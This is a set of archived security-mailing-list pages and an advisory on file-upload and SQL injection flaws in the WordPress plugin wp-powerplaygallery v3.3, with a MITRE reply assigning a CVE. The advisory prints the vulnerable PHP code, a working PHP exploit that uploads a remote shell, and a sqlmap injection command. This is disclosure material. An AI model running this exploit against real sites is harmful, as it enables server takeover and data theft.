=== Content from seclists.org_dc29db96_20250125_221059.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](63)
[By Date](date.html#64)
[![Next](/images/right-icon-16x16.png)](65)

[![Previous](/images/left-icon-16x16.png)](63)
[By Thread](index.html#64)
[![Next](/images/right-icon-16x16.png)](65)

![](/shared/images/nst-icons.svg#search)

# Remote file upload vulnerability & SQLi in wordpress plugin wp-powerplaygallery v3.3

---

*From*: "Larry W. Cashdollar" <larry0 () me com>

*Date*: Sun, 12 Jul 2015 16:11:38 -0400

---

```
Title: Remote file upload vulnerability & SQLi in wordpress plugin wp-powerplaygallery v3.3
Author: Larry W. Cashdollar, @_larry0
Date: 2015-06-27
Download Site: <https://wordpress.org/plugins/wp-powerplaygallery>
Vendor: WP SlideShow
Vendor Notified: 2015-06-29
Advisory: <http://www.vapid.dhs.org/advisory.php?v=132>
Vendor Contact: plugins () wordpress org
Description: This is the best gallery for touch screens. It is fully touch enabled with great features. This gallery is
compatible wiht iphone and ipads. It is also allow us to use it as a widget.You can also enable this Powerplay Gallery
on your wordpress site by placing code snippet in your template (.php) files. It shows flash gallery for desktops and
touch enabled version for ipad and iphones.
Vulnerability:
1. Ability to create directories out side of the upload path by using ../:
Lines 56-59 of upload.php:

56 // Create target dir
57 if (!file_exists($targetDir)) {
58         @mkdir($targetDir);
59 }

2. Arbitrary file uploads to a path in the web root directory:
Lines 138-160 of uploads.php don’t verify what types of files are allowed or where they should be placed:

138 // Open temp file
139 if (!$out = @fopen("{$filePath}.part", $chunks ? "ab" : "wb")) {
140         die('{"jsonrpc" : "2.0", "error" : {"code": 102, "message": "Failed to open output stream."}, "id" :
"id"}');
141 }
142
143 if (!empty($_FILES)) {
144         if ($_FILES["file"]["error"] || !is_uploaded_file($_FILES["file"]["tmp_name"])) {
145                 die('{"jsonrpc" : "2.0", "error" : {"code": 103, "message": "Failed to move uploaded file."}    ,
"id" : "id"}');
146         }
147
148         // Read binary input stream and append it to temp file
149         if (!$in = @fopen($_FILES["file"]["tmp_name"], "rb")) {
150                 die('{"jsonrpc" : "2.0", "error" : {"code": 101, "message": "Failed to open input stream."},
"id" : "id"}');
151         }
152 } else {
153         if (!$in = @fopen("php://input", "rb")) {
154                 die('{"jsonrpc" : "2.0", "error" : {"code": 101, "message": "Failed to open input stream."},
"id" : "id"}');
155         }
156 }
157
158 while ($buff = fread($in, 4096)) {
159         fwrite($out, $buff);
160 }

3. Sql injection
Lines 131-135 of upload.php fail to handle user input appropriately either by sanitizing or paramaterizing it.
Injection points are
any GET/POST to albumid or name.

131 $query = "INSERT INTO ".$wpdb->prefix."pp_images (`category_id`, `title`, `description`, `price`, `thumb`, `
image`, `status`, `order`, `creation_date` )
132           VALUES (".$_REQUEST['albumid'].",'".$imgname[0]."','".$imgname[0]."','','".$resize."','".$_REQUEST
['name']."',1,'','NULL')";
133
134           $wpdb->query($query);
135

CVEID:
OSVDB:
Exploit Code:
        • <?php
        • /*Remote shell upload exploit for wp-powerplaygallery v3.3 */
        • /*Larry W. Cashdollar @_larry0
        • 6/27/2015
        • albumid needs to be a numeric value matching an existing album number, 1 is probably a good start
        • but you can enumerate these by using curl, and looking for redirect 301 responses:
        • e.g. $ curl <http://www.vapidlabs.com/wp-content/uploads/power_play/4_uploadfolder/big>
        • ->301 exists else 404 doesn't.
        • shell is <http://www.vapidlabs.com/wp-content/uploads/power_play/4_uploadfolder/big/shell.php>
        • */
        •
        •
        •       $target_url = '[http://www.vapidlabs.com/wp-content/plugins/wp-powerplaygallery/upload.php'](http://www.vapidlabs.com/wp-content/plugins/wp-powerplaygallery/upload.php%26apos);;
        •       $file_name_with_full_path = '/var/www/shell.php';
        •
        •         echo "POST to $target_url $file_name_with_full_path";
        •       $post = array('albumid'=>'foo' , 'name' => 'shell.php','file'=>'@'.$file_name_with_full_path);
        •
        •         $ch = curl_init();
        •       curl_setopt($ch, CURLOPT_URL,$target_url);
        •       curl_setopt($ch, CURLOPT_POST,1);
        •       curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        •         curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
        •       $result=curl_exec ($ch);
        •       curl_close ($ch);
        •         echo "<hr>";
        •       echo $result;
        •         echo "<hr>";
        • ?>
SQLi PoC:
$ sqlmap -u <http://www.vapidlabs.com/wp-content/plugins/wp-powerplaygallery/upload.php> --data "albumid=1”  —dbms mysql

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](63)
[By Date](date.html#64)
[![Next](/images/right-icon-16x16.png)](65)

[![Previous](/images/left-icon-16x16.png)](63)
[By Thread](index.html#64)
[![Next](/images/right-icon-16x16.png)](65)

### Current thread:

* **Remote file upload vulnerability & SQLi in wordpress plugin wp-powerplaygallery v3.3** *Larry W. Cashdollar (Jul 13)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.openwall.com_b3a52a6b_20250125_221100.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](../../../2015/07/19/1) [[next>]](2) [[<thread-prev]](../../../2015/07/12/3) [[thread-next>]](../../../2015/07/27/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-Id: <20150720145820.751AC72E1A4@smtpvbsrv1.mitre.org>
Date: Mon, 20 Jul 2015 10:58:20 -0400 (EDT)
From: cve-assign@...re.org
To: larry0@...com
Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
Subject: Re: Remote file upload vulnerability & SQLi in wordpress plugin wp-powerplaygallery v3.3

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

This seems to be one of several cases where a third party has taken
example code from the Ephox (formerly Moxiecode) Plupload product and
added undesirable new behavior.

For background,
<https://raw.githubusercontent.com/moxiecode/plupload/master/examples/upload.php>
is the current upstream code. Although this upstream code could
introduce security problems in some contexts, the code is not assigned
any CVE IDs because it is clearly marked as an example, and would not
be installed on a web server as a normal part of installing Plupload:

  #!! IMPORTANT:
  #!! this file is just an example, it doesn't incorporate any security checks and
  #!! is not recommended to be used in production environment as it is. Be sure to
  #!! revise it and customize to your needs.

The code reported here is from
<http://plugins.svn.wordpress.org/wp-powerplaygallery/trunk/upload.php>
instead. All of the specific reported issues are ones that exist in
wp-powerplaygallery and don't exist in Plupload.

The most obvious difference is that the "INSERT INTO" is a new code
block in wp-powerplaygallery - the upstream code doesn't use SQL at
all.

> 3. Sql injection
> Lines 131-135 of upload.php fail to handle user input appropriately either by sanitizing or paramaterizing it. Injection points are
> any GET/POST to albumid or name.

Use CVE-2015-5599.

> 1. Ability to create directories out side of the upload path by using ../:
> Lines 56-59 of upload.php:
>
> 56 // Create target dir
> 57 if (!file_exists($targetDir)) {
> 58         @mkdir($targetDir);

As far as we can tell, the issue you are reporting (when a current PHP
version is used) is that the attacker can create a directory anywhere
with "_uploadfolder" at the end of its name. This behavior isn't
required for achieving PHP code execution, and seems unlikely to help
with other important attacks. It might waste disk space on a small
filesystem, and might allow an attacker to store files outside of
wp-content (e.g., in a directory that wouldn't be checked during a
user's post-exploitation cleanup). If so, then this is an issue that
can be included in CVE, but it seems marginal.

For anyone who is interested in reporting these types of low-priority
side issues: it would be helpful to explicitly state that the issue is
independently relevant and could be independently fixed.

> 2. Arbitrary file uploads to a path in the web root directory:
> Lines 138-160 of uploads.php don't verify what types of files are allowed or where they should be placed:

We didn't completely understand this part. It seems that the essence
of the problem is that the product could reject unsafe file types such
as .php files, but doesn't do that. That can have one CVE ID. Is there
also a problem with "where they should be placed" within this part of
the code? The files seem to be placed in a *_uploadfolder/big/
directory, which is a correct directory for an upload of an image
file.

Are you also reporting any authorization problem? Is upload.php
responsible for verifying that the client user has the upload_files
capability, regardless of what file type is being uploaded?

> albumid needs to be a numeric value matching an existing album number, 1 is probably a good start
> but you can enumerate these by using curl, and looking for redirect 301 responses:

Why does the album number need to exist? Wasn't the mkdir supposed to
create the directory for an arbitrary $_REQUEST['albumid'] value?

- --
CVE assignment team, MITRE CVE Numbering Authority
M/S M300
202 Burlington Road, Bedford, MA 01730 USA
[ PGP key available through <http://cve.mitre.org/cve/request_id.html> ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.14 (SunOS)

iQEcBAEBAgAGBQJVrQv+AAoJEKllVAevmvmsO8AH/3hMf5MDgzozxwptBSXnBrVv
8gjPcUDIDop1KqM5ZDAeC8X+tp/oQzgtN9ZPqL2mkyYWdhs3Rm+Pv/+VlFIAKjTC
NbrL9LsuaVe9UrK2KL0zzQ0okyXOEeDGz2Myb5YrGVvshNMTmYcGOyL4oP/IiZmy
8XZCM6QJolEiMjtX2w1J9ZdlBV7yRh+d4ie/XEdmvcPBEWdvmYt/UxTs8guZ1PZM
8PBEUz8sTdI94Cl0mW0DRGZLzZ/T9tOvHq/Gxl0+wb+khRzWJkfPL8zuVjoi1P5x
ZFQrcWkK6pyQCYimLLRTQs6x6MY8NdKdlUQ0t4hljg1UEVm4QSYiab9qBGsDVwM=
=94ua
-----END PGP SIGNATURE-----

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.vapid.dhs.org_d964a504_20250125_221101.html ===


| Advisory #: 132 |
| --- |
| **Title:** Remote file upload vulnerability & Blind SQLi in wordpress plugin wp-powerplaygallery v3.3 |
| **Author:** Larry W. Cashdollar, @\_larry0 |
| **Date:** 2015-06-27 |
| [[CVE-2015-5599](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5599)][[CVE-2015-5681](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5681)][[CVE-2015-5682](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5682)] |
| **Download Site:** <https://wordpress.org/plugins/wp-powerplaygallery> |
| **Vendor:** |
| **Vendor Notified:**  2015-06-29 |
| **Vendor Contact:** plugins@wordpress.org |
| **Advisory:** <http://www.vapid.dhs.org/advisory.php?v=132>http://www.vapid.dhs.org/advisory.php?v=132 |
| **Description:** This is the best gallery for touch screens. It is fully touch enabled with great features. This gallery is compatible wiht iphone and ipads. It is also allow us to use it as a widget.You can also enable this Powerplay Gallery on your wordpress site by placing code snippet in your template (.php) files. It shows flash gallery for desktops and touch enabled version for ipad and iphones. |
| **Vulnerability:**1. Ability to create directories out side of the upload path by using ../: Lines 56-59 of upload.php: 56 // Create target dir 57 if (!file\_exists($targetDir)) { 58 @mkdir($targetDir); 59 } 2. Arbitrary file uploads to a path in the web root directory: Lines 138-160 of uploads.php don’t verify what types of files are allowed or where they should be placed: 138 // Open temp file 139 if (!$out = @fopen("{$filePath}.part", $chunks ? "ab" : "wb")) { 140 die('{"jsonrpc" : "2.0", "error" : {"code": 102, "message": "Failed to open output stream."}, "id" : "id"}'); 141 } 142 143 if (!empty($\_FILES)) { 144 if ($\_FILES["file"]["error"] || !is\_uploaded\_file($\_FILES["file"]["tmp\_name"])) { 145 die('{"jsonrpc" : "2.0", "error" : {"code": 103, "message": "Failed to move uploaded file."} , "id" : "id"}'); 146 } 147 148 // Read binary input stream and append it to temp file 149 if (!$in = @fopen($\_FILES["file"]["tmp\_name"], "rb")) { 150 die('{"jsonrpc" : "2.0", "error" : {"code": 101, "message": "Failed to open input stream."}, "id" : "id"}'); 151 } 152 } else { 153 if (!$in = @fopen("php://input", "rb")) { 154 die('{"jsonrpc" : "2.0", "error" : {"code": 101, "message": "Failed to open input stream."}, "id" : "id"}'); 155 } 156 } 157 158 while ($buff = fread($in, 4096)) { 159 fwrite($out, $buff); 160 } 3. Sql injection Lines 131-135 of upload.php fail to handle user input appropriately either by sanitizing or paramaterizing it. Injection points are any GET/POST to albumid or name. 131 $query = "INSERT INTO ".$wpdb->prefix."pp\_images (`category\_id`, `title`, `description`, `price`, `thumb`, ` image`, `status`, `order`, `creation\_date` ) 132 VALUES (".$\_REQUEST['albumid'].",'".$imgname[0]."','".$imgname[0]."','','".$resize."','".$\_REQUEST ['name']."',1,'','NULL')"; 133 134 $wpdb->query($query); 135 |
| **Export:** [JSON](export_json.py?id=) [TEXT](txt/.txt) [XML](xml.php?s=) |
| **Exploit Code:** ```   1. <?php 2. /*Remote shell upload exploit for wp-powerplaygallery v3.3 */ 3. /*Larry W. Cashdollar @_larry0 4. 6/27/2015 5. albumid needs to be a numeric value matching an existing album number, 1 is probably a good start 6. but you can enumerate these by using curl, and looking for redirect 301 responses: 7. e.g. $ curl http://www.vapidlabs.com/wp-content/uploads/power_play/4_uploadfolder/big 8. ->301 exists else 404 doesn't. 9. shell is http://www.vapidlabs.com/wp-content/uploads/power_play/4_uploadfolder/big/shell.php 10. */ 13. $target_url = 'http://www.vapidlabs.com/wp-content/plugins/wp-powerplaygallery/upload.php'; 14. $file_name_with_full_path = '/var/www/shell.php'; 16. echo "POST to $target_url $file_name_with_full_path"; 17. $post = [array](http://www.php.net/array)('albumid'=>'foo' , 'name' => 'shell.php','file'=>'@'.$file_name_with_full_path); 19. $ch = [curl_init](http://www.php.net/curl_init)(); 20. [curl_setopt](http://www.php.net/curl_setopt)($ch, CURLOPT_URL,$target_url); 21. [curl_setopt](http://www.php.net/curl_setopt)($ch, CURLOPT_POST,1); 22. [curl_setopt](http://www.php.net/curl_setopt)($ch, CURLOPT_POSTFIELDS, $post); 23. [curl_setopt](http://www.php.net/curl_setopt)($ch, CURLOPT_RETURNTRANSFER,1); 24. $result=[curl_exec](http://www.php.net/curl_exec) ($ch); 25. [curl_close](http://www.php.net/curl_close) ($ch); 26. echo "<hr>"; 27. echo $result; 28. echo "<hr>"; 29. ?>  ``` |
| **Screen Shots:** |
| **Notes:** |



=== Content from packetstormsecurity.com_a159f082_20250125_221057.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)


